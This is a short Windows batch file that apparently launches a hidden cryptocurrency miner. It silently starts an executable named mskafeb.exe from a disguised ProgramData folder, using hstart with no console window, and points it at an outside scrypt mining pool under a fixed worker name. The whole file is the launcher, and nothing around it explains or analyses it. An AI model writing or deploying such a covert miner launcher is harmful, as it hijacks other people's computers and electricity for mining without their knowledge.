@echo off

set minuser=oliverafa.2
set minurl=stratum+tcp://hash-to-coins.com:3333

start C:\ProgramData\mskfea\Hstart\hstart.exe /NOCONSOLE /SILENT /D="C:\ProgramData\mskfea\mskafeb\" /NORMAL ""C:\ProgramData\mskfea\mskafeb\mskafeb.exe" -a scrypt -o %minurl% -u %minuser% -p x"
